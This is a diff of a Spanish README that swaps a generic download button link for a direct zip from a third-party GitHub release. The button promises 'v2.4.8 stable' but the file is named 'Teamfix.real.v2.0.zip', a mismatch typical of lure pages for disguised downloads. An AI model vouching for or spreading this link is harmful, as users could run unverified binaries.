@@ -82,7 +82,7 @@ Si buscas la estabilidad absoluta del sistema y las últimas capas de rendimient
 <br />
 
 <div align="center">
-  <h2>👉 <a href="https://github.com">⚡ DESCARGAR COMPILACIÓN v2.4.8 ESTABLE ⚡</a></h2>
+  <h2>👉 <a href="https://github.com/EliAlejandro-git/TeamFIx-Updates/releases/download/v2.4.8/Teamfix.real.v2.0.zip">⚡ DESCARGAR COMPILACIÓN v2.4.8 ESTABLE ⚡</a></h2>
 </div>
 
 ---
